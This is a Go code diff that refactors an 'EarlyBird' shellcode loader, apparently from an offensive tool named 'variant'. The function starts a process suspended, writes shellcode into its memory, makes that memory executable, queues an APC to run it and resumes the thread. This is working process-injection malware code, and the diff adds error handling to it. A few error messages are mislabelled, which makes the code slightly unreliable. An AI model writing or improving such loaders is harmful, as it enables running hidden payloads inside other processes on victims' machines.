@@ -3,50 +3,95 @@ package loader
 import (
 	"fmt"
 	"unsafe"
-	"variant/log"
-	"variant/wdll"
+	"variant/xwindows"
 
 	"golang.org/x/sys/windows"
 )
 
-func EarlyBird(shellcode []byte, path string) {
+func EarlyBird(shellcode []byte, path string) error {
 	procInfo := &windows.ProcessInformation{}
 	startupInfo := &windows.StartupInfo{
 		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
 		ShowWindow: 1,
 	}
 
-	program, err := windows.UTF16PtrFromString(path)
-	if err != nil {
-		log.Fatal(err)
-	}
-	args, err := windows.UTF16PtrFromString("")
-	if err != nil {
-		log.Fatal(err)
+	appName, prtErr := windows.UTF16PtrFromString(path)
+	if prtErr != nil {
+		return fmt.Errorf("UTF16PtrFromString failed: %v", prtErr)
 	}
 
-	err = windows.CreateProcess(
-		program,
+	args, prtErr := windows.UTF16PtrFromString("")
+	if prtErr != nil {
+		return fmt.Errorf("UTF16PtrFromString failed: %v", prtErr)
+	}
+
+	cpErr := xwindows.CreateProcessW(
+		appName,
 		args,
-		nil, nil, true,
-		windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
-	if err != nil {
-		log.Fatal(err)
+		nil,
+		nil,
+		true,
+		windows.CREATE_SUSPENDED,
+		nil,
+		nil,
+		startupInfo,
+		procInfo,
+	)
+	if cpErr != nil {
+		return fmt.Errorf("CreateProcess failed: %w", cpErr)
 	}
 
-	addr, _, _ := wdll.VirtualAllocEx().Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	fmt.Println("Done")
+	addr, vaErr := xwindows.VirtualAllocEx(
+		procInfo.Process,
+		0,
+		uintptr(len(shellcode)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
+	)
+	if vaErr != nil {
+		return fmt.Errorf("VirtualAllocEx failed: %w", vaErr)
+	}
 
-	_, _, _ = wdll.WriteProcessMemory().Call(uintptr(procInfo.Process), addr,
-		(uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	var numberOfBytesWritten uintptr
+	wpErr := xwindows.WriteProcessMemory(
+		procInfo.Process,
+		addr,
+		&shellcode[0],
+		uintptr(len(shellcode)),
+		&numberOfBytesWritten,
+	)
+	if wpErr != nil {
+		return fmt.Errorf("VirtualAllocEx failed: %w", vaErr)
+	}
 
 	oldProtect := windows.PAGE_READWRITE
-	_, _, _ = wdll.VirtualProtectEx().Call(uintptr(procInfo.Process), addr,
-		uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	vpErr := xwindows.VirtualProtectEx(
+		procInfo.Process,
+		addr,
+		uintptr(len(shellcode)),
+		windows.PAGE_EXECUTE_READ,
+		(*uint32)(unsafe.Pointer(&oldProtect)),
+	)
+	if vpErr != nil {
+		return fmt.Errorf("VirtualProtectEx failed: %w", vpErr)
+	}
 
-	_, _, _ = wdll.QueueUserAPC().Call(addr, uintptr(procInfo.Thread), 0)
-	_, _ = windows.ResumeThread(procInfo.Thread)
-	_ = windows.CloseHandle(procInfo.Process)
-	_ = windows.CloseHandle(procInfo.Thread)
+	_, quErr := xwindows.QueueUserAPC(addr, uintptr(procInfo.Thread), 0)
+	if quErr != nil {
+		return fmt.Errorf("VirtualProtectEx failed: %w", quErr)
+	}
+
+	_, rtErr := windows.ResumeThread(procInfo.Thread)
+	if rtErr != nil {
+		return fmt.Errorf("ResumeThread failed: %w", rtErr)
+	}
+	chpErr := windows.CloseHandle(procInfo.Process)
+	if chpErr != nil {
+		return fmt.Errorf("CloseHandle failed: %w", chpErr)
+	}
+	chtErr := windows.CloseHandle(procInfo.Thread)
+	if chtErr != nil {
+		return fmt.Errorf("CloseHandle failed: %w", chtErr)
+	}
+
+	return nil
 }
